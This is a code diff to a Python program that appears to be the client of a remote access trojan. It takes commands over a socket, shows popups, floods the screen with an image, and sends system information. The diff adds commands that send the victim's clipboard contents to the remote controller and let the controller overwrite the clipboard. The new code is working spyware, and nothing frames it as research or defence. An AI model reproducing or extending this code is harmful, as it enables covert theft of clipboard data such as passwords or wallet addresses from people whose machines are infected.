@@ -15,7 +15,7 @@ from PIL import Image
 from platform import machine , version , platform ,processor
 from platform import system as sysInfo
 from psutil import disk_usage , virtual_memory 
-
+from clipboard import paste , copy
 def popup(conn,command):
     if command[2:7]=="alert":
         lsCommnand=command.strip().split("|")
@@ -45,6 +45,18 @@ def HDalert(conn):
     img=Image.fromarray(CVimg)
     for i in range(10000):
         img.show()
+def clipboard(command,conn):
+    if command == "GCLPB":
+        conn.send((paste()+"ENDeyeRT").encode())
+    elif command=="WCLPB":
+        data=''
+        while 1:
+            data2=conn.recv(10000).decode()
+            if "ENDeyeRT" in data2:
+                data+=data2.replace("ENDeyeRT" , "")
+                break
+            data+=data2
+        copy(data)
 def sendInfo(conn):
     if "windows" in sysInfo():
         path=r"C:\\"
@@ -263,10 +275,12 @@ def commandRunner(conn,command,key):
             HDalert(conn)
             conn.send(b"END")
             break
+        elif command=="GCLPB" or command=="WCLPB":
+            clipboard(command , conn)
+            break
         elif command=="Sinfo":
             sendInfo(conn)
             conn.send(b"END")
             break
         else :
             break
-
